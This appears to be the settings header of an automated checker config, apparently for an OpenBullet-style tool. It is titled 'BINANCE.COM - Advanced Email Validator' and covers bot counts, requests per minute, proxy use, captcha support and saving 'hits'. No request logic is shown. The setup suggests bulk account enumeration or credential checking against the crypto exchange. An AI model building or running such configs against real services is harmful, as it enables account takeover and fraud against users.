  "Name": "BINANCE.COM - Advanced Email Validator",
  "SuggestedBots": 300,
  "MaxCPM": 300,
  "LastModified": "2025-11-20T15:45:00+00:00",
  "AdditionalInfo": "Advanced Email Validator with Captcha Support",
  "RequiredPlugins": [],
  "Author": "legendhkek",
  "Version": "1.0.0",
  "SaveEmptyCaptures": false,
  "ContinueOnCustom": true,
  "SaveHitsToTextFile": true,
  "IgnoreResponseErrors": false,
  "MaxRedirects": 10,
  "NeedsProxies": true,
